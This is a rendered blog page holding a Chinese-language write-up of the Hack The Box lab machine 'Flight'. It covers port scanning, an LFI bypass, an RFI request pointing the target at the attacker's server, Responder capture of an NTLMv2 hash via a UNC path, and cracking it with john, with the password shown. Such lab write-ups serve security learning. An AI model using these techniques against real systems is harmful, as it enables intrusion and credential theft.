@@ -1,0 +1,879 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" Machine Info Difficulty: Hard OS: Windows Nmap Result PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 127 Simple DNS Plus 80/tcp open http syn-ack ttl 127 Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1) | http-methods: | Supported Methods: OPTIONS HEAD GET POST TRACE |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1 |_http-title: g0 Aviation 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-29 21:10:16Z) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 127 464/tcp open kpasswd5? syn-ack ttl 127 593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 127 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 127 9389/tcp open mc-nmf syn-ack ttl 127 .NET Message Framing 49668/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49675/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 49676/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49703/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49735/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Enumeration {.wp-block-heading} ">
+<title>HTB-Flight-Writeup</title>
+
+<link rel='canonical' href='http://localhost:1313/htb-flight-Writeup/'>
+
+<link rel="stylesheet" href="/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css"><meta property='og:title' content="HTB-Flight-Writeup">
+<meta property='og:description' content=" Machine Info Difficulty: Hard OS: Windows Nmap Result PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 127 Simple DNS Plus 80/tcp open http syn-ack ttl 127 Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1) | http-methods: | Supported Methods: OPTIONS HEAD GET POST TRACE |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1 |_http-title: g0 Aviation 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-29 21:10:16Z) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 127 464/tcp open kpasswd5? syn-ack ttl 127 593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 127 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 127 9389/tcp open mc-nmf syn-ack ttl 127 .NET Message Framing 49668/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49675/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 49676/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49703/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49735/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Enumeration {.wp-block-heading} ">
+<meta property='og:url' content='http://localhost:1313/htb-flight-Writeup/'>
+<meta property='og:site_name' content='JoWhite'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-05-30T13:46:56&#43;00:00'/><meta property='article:modified_time' content='2025-05-30T13:46:56&#43;00:00'/><meta property='og:image' content='http://localhost:1313/legacy/uploads/2025/05/1748606734-a7af9035e5089332dfbfeb328d663f3e-150x150.webp' />
+<meta name="twitter:title" content="HTB-Flight-Writeup">
+<meta name="twitter:description" content=" Machine Info Difficulty: Hard OS: Windows Nmap Result PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 127 Simple DNS Plus 80/tcp open http syn-ack ttl 127 Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1) | http-methods: | Supported Methods: OPTIONS HEAD GET POST TRACE |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1 |_http-title: g0 Aviation 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-29 21:10:16Z) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 127 464/tcp open kpasswd5? syn-ack ttl 127 593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 127 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 127 9389/tcp open mc-nmf syn-ack ttl 127 .NET Message Framing 49668/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49675/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 49676/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49703/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49735/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Enumeration {.wp-block-heading} "><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://localhost:1313/legacy/uploads/2025/05/1748606734-a7af9035e5089332dfbfeb328d663f3e-150x150.webp' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/en/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_8394d4d868d05114.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">😀</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/en">JoWhite</a></h1>
+            <h2 class="site-description">OraOra!</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/en/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="http://localhost:1313/" >中文</option>
+                                
+                                    <option value="http://localhost:1313/en/" selected>English</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#machine-info">Machine Info</a></li>
+    <li><a href="#nmap-result">Nmap Result</a></li>
+    <li><a href="#enumeration-wp-block-heading">Enumeration {.wp-block-heading}<figure class="wp-block-image size-large"></a></li>
+    <li><a href="#rfi---steal-ntlm">RFI -&gt; Steal NTLM</a></li>
+    <li><a href="#initial-foothold">Initial Foothold</a></li>
+    <li><a href="#lateral-movement">Lateral Movement</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/htb-flight-Writeup/">
+                
+                    <img src="/legacy/uploads/2025/05/1748606734-a7af9035e5089332dfbfeb328d663f3e-150x150.webp" loading="lazy" alt="Featured image of post HTB-Flight-Writeup" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/en/categories/htb/" >
+                HackTheBox Writeups
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/htb-flight-Writeup/">HTB-Flight-Writeup</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">May 30, 2025</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+        <footer class="article-translations">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+            <div>
+                
+                    <a href="http://localhost:1313/htb-flight-Writeup/" class="link">中文</a>
+                
+            </div>
+        </footer>
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <div class="wp-block-image">
+  <figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="300" height="300" src="../legacy/uploads/2025/05/1748606734-a7af9035e5089332dfbfeb328d663f3e.webp" alt="" class="wp-image-1483" srcset="../legacy/uploads/2025/05/1748606734-a7af9035e5089332dfbfeb328d663f3e.webp 300w, ../legacy/uploads/2025/05/1748606734-a7af9035e5089332dfbfeb328d663f3e-150x150.webp 150w" sizes="auto, (max-width: 300px) 100vw, 300px" /></figure>
+</div>
+<h2 id="machine-info">Machine Info
+</h2><ul class="wp-block-list">
+  <li>
+    Difficulty: Hard
+  </li>
+  <li>
+    OS: Windows
+  </li>
+</ul>
+<h2 id="nmap-result">Nmap Result
+</h2><div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+PORT      STATE SERVICE       REASON          VERSION
+53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
+80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
+| http-methods: 
+|   Supported Methods: OPTIONS HEAD GET POST TRACE
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
+|_http-title: g0 Aviation
+88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-29 21:10:16Z)
+135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds? syn-ack ttl 127
+464/tcp   open  kpasswd5?     syn-ack ttl 127
+593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped    syn-ack ttl 127
+3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped    syn-ack ttl 127
+9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
+49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49675/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+49676/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49703/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49735/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+</pre>
+</div>
+<h2 id="enumeration-wp-block-heading">Enumeration {.wp-block-heading}<figure class="wp-block-image size-large">
+</h2><p><img loading="lazy" decoding="async" width="1024" height="534" src="../legacy/uploads/2025/05/1748606731-image-1024x534.png" alt="" class="wp-image-1482" srcset="../legacy/uploads/2025/05/1748606731-image-1024x534.png 1024w, ../legacy/uploads/2025/05/1748606731-image-300x156.png 300w, ../legacy/uploads/2025/05/1748606731-image-768x400.png 768w, ../legacy/uploads/2025/05/1748606731-image-1536x800.png 1536w, ../legacy/uploads/2025/05/1748606731-image.png 1591w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>80端口是一个机票预订网站，没有什么有用信息。用ffuf遍历也没找到有用信息。用enum4linux查看smb服务:<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="255" src="../legacy/uploads/2025/05/1748606876-image-1024x255.png" alt="" class="wp-image-1486" srcset="../legacy/uploads/2025/05/1748606876-image-1024x255.png 1024w, ../legacy/uploads/2025/05/1748606876-image-300x75.png 300w, ../legacy/uploads/2025/05/1748606876-image-768x191.png 768w, ../legacy/uploads/2025/05/1748606876-image.png 1206w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>允许匿名登录，但无法list shares:<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="210" src="../legacy/uploads/2025/05/1748606902-image-1024x210.png" alt="" class="wp-image-1487" srcset="../legacy/uploads/2025/05/1748606902-image-1024x210.png 1024w, ../legacy/uploads/2025/05/1748606902-image-300x62.png 300w, ../legacy/uploads/2025/05/1748606902-image-768x158.png 768w, ../legacy/uploads/2025/05/1748606902-image.png 1038w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>查看ldap服务是否无需验证就可以请求信息：<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="961" height="351" src="../legacy/uploads/2025/05/1748606963-image.png" alt="" class="wp-image-1489" srcset="../legacy/uploads/2025/05/1748606963-image.png 961w, ../legacy/uploads/2025/05/1748606963-image-300x110.png 300w, ../legacy/uploads/2025/05/1748606963-image-768x281.png 768w" sizes="auto, (max-width: 961px) 100vw, 961px" /> </figure></p>
+<p>需要认证。转头去看http服务，用ffuf遍历看看是否有子域名：<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="363" src="../legacy/uploads/2025/05/1748607021-image-1024x363.png" alt="" class="wp-image-1491" srcset="../legacy/uploads/2025/05/1748607021-image-1024x363.png 1024w, ../legacy/uploads/2025/05/1748607021-image-300x106.png 300w, ../legacy/uploads/2025/05/1748607021-image-768x272.png 768w, ../legacy/uploads/2025/05/1748607021-image-1536x545.png 1536w, ../legacy/uploads/2025/05/1748607021-image.png 1675w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>发现子域名school. 加入到/etc/hosts 里面并访问:<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="590" src="../legacy/uploads/2025/05/1748607059-image-1024x590.png" alt="" class="wp-image-1493" srcset="../legacy/uploads/2025/05/1748607059-image-1024x590.png 1024w, ../legacy/uploads/2025/05/1748607059-image-300x173.png 300w, ../legacy/uploads/2025/05/1748607059-image-768x443.png 768w, ../legacy/uploads/2025/05/1748607059-image.png 1480w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<h2 id="rfi---steal-ntlm">RFI -&gt; Steal NTLM
+</h2><p>在查看一番后只有这里最让我感觉可疑：<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="542" src="../legacy/uploads/2025/05/1748607095-image-1024x542.png" alt="" class="wp-image-1494" srcset="../legacy/uploads/2025/05/1748607095-image-1024x542.png 1024w, ../legacy/uploads/2025/05/1748607095-image-300x159.png 300w, ../legacy/uploads/2025/05/1748607095-image-768x407.png 768w, ../legacy/uploads/2025/05/1748607095-image.png 1267w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>看到这种链接就会想起LFI，尝试一下：<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="425" src="../legacy/uploads/2025/05/1748607184-image-1024x425.png" alt="" class="wp-image-1496" srcset="../legacy/uploads/2025/05/1748607184-image-1024x425.png 1024w, ../legacy/uploads/2025/05/1748607184-image-300x124.png 300w, ../legacy/uploads/2025/05/1748607184-image-768x319.png 768w, ../legacy/uploads/2025/05/1748607184-image.png 1140w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>请求被拦截. 探索一番后发现后端会拦截包含 .. 的请求<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="656" height="456" src="../legacy/uploads/2025/05/1748607234-image.png" alt="" class="wp-image-1498" srcset="../legacy/uploads/2025/05/1748607234-image.png 656w, ../legacy/uploads/2025/05/1748607234-image-300x209.png 300w" sizes="auto, (max-width: 656px) 100vw, 656px" /> </figure></p>
+<p>于是我就尝试了下全局路径：<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="400" src="../legacy/uploads/2025/05/1748607274-image-1024x400.png" alt="" class="wp-image-1500" srcset="../legacy/uploads/2025/05/1748607274-image-1024x400.png 1024w, ../legacy/uploads/2025/05/1748607274-image-300x117.png 300w, ../legacy/uploads/2025/05/1748607274-image-768x300.png 768w, ../legacy/uploads/2025/05/1748607274-image.png 1122w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>LFI成功. 用ffuf遍历了一些常见的配置文件，都没有找到有用的信息。</p>
+<p>此时想到靶机可能还有RFI，尝试一下:</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: plain; title: ; notranslate" title="">
+echo &#039;&lt;?php phpinfo(); ?&gt;&#039; &gt; phpinfo.php
+# 在网页请求
+http://school.flight.htb/index.php?view=http://10.10.16.8/phpinfo.php
+</pre>
+</div><figure class="wp-block-image size-large">
+<p><img loading="lazy" decoding="async" width="1024" height="385" src="../legacy/uploads/2025/05/1748607728-image-1024x385.png" alt="" class="wp-image-1503" srcset="../legacy/uploads/2025/05/1748607728-image-1024x385.png 1024w, ../legacy/uploads/2025/05/1748607728-image-300x113.png 300w, ../legacy/uploads/2025/05/1748607728-image-768x289.png 768w, ../legacy/uploads/2025/05/1748607728-image.png 1317w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>虽然访问成功，但php并没有执行。此时想到了还可以让靶机想我请求smb连接. 先开启responder监听：</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+sudo responder -I tun0
+#然后再请求
+http://school.flight.htb/index.php?view=//10.10.16.8/test
+</pre>
+</div><figure class="wp-block-image size-full">
+<p><img loading="lazy" decoding="async" width="786" height="233" src="../legacy/uploads/2025/05/1748607897-image.png" alt="" class="wp-image-1507" srcset="../legacy/uploads/2025/05/1748607897-image.png 786w, ../legacy/uploads/2025/05/1748607897-image-300x89.png 300w, ../legacy/uploads/2025/05/1748607897-image-768x228.png 768w" sizes="auto, (max-width: 786px) 100vw, 786px" /> </figure></p>
+<ul class="wp-block-list">
+  <li>
+    原理：当windows环境内的php遇到诸如 //x.x.x.x/xxx 这样的路径时，会把这个地址理解为UNC路径，即 <strong>//服务器/共享名/文件名</strong>. 随后系统识别路径为网络路径，于是发起smb连接。（p.s. 在linux环境下则不行）
+  </li>
+</ul>
+<h2 id="initial-foothold">Initial Foothold
+</h2><p>截取到了svc_apache的NTLMv2 hash，交给john本地爆破:</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: plain; title: ; notranslate" title="">
+john --wordlist=/usr/share/wordlists/rockyou.txt apahash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R &#x5B;MD4 HMAC-MD5 32/64])
+Will run 4 OpenMP threads
+Press &#039;q&#039; or Ctrl-C to abort, almost any other key for status
+S@Ss!K@*t13      (svc_apache)     
+1g 0:00:00:02 DONE (2025-05-30 22:30) 0.3663g/s 3906Kp/s 3906Kc/s 3906KC/s SADSAM..S42150461
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed. 
+</pre>
+</div>
+<p>获取密码 S@Ss!K@*t13 有了密码后则可以用bloodhound-python远程拉取AD架构信息：<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="400" src="../legacy/uploads/2025/05/1748608419-image-1024x400.png" alt="" class="wp-image-1513" srcset="../legacy/uploads/2025/05/1748608419-image-1024x400.png 1024w, ../legacy/uploads/2025/05/1748608419-image-300x117.png 300w, ../legacy/uploads/2025/05/1748608419-image-768x300.png 768w, ../legacy/uploads/2025/05/1748608419-image.png 1196w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>上传到bloodhound并分析：<figure class="wp-block-image size-large"></p>
